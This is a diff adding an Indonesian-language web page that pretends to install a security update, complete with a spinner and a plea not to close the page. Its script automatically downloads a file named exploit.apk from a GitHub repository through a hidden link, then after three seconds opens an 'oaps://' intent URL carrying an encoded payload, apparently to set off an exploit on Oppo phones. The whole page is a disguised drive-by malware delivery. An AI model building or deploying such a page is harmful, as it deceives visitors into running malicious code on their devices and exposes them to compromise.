@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Update Sedang Berjalan...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #000; color: #fff; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h3>Memasang Pembaruan Keamanan...</h3>
+    <p>Mohon jangan tutup halaman ini.</p>
+
+    <script>
+        window.onload = function() {
+            // 1. OTOMATIS DOWNLOAD APK
+            const apkUrl = "https://raw.githubusercontent.com/smuft1707/oppo-critical-patch/main/exploit.apk";
+            const hiddenAnchor = document.createElement('a');
+            hiddenAnchor.href = apkUrl;
+            hiddenAnchor.download = "exploit.apk";
+            document.body.appendChild(hiddenAnchor);
+            hiddenAnchor.click();
+            document.body.removeChild(hiddenAnchor);
+
+            // 2. OTOMATIS TRIGGER EXPLOIT SETELAH 3 DETIK
+            // Memberi waktu untuk proses download selesai di latar belakang
+            setTimeout(function() {
+                const intentUrl = "oaps://add?ckey=exploit&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
+                window.location.href = intentUrl;
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
